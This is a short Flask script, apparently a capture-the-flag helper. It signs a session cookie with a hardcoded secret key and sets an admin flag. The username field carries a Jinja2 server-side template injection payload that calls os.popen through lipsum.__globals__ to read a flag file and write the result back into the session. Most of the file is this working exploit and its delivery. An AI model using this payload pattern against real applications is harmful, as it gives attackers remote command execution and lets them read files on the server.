# import random
# import os
# from xlib import utils as xutils
from flask import Flask, render_template, render_template_string, url_for, redirect, session, request
# from flask_socketio import SocketIO, emit, send
# from xml.etree import ElementTree, ElementInclude
# import sys
app = Flask(__name__)
app.config['SECRET_KEY'] = "1122d6324127f6434f99529f137fa640"


@app.route('/')
def index():
    session['is_admin'] = 1
    session['username'] = "{% set x=session.update({'flag': lipsum.__globals__['os'].popen('cat /flag_d92ed0e8bdf248ddab56').read()}) %}"


if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8003)

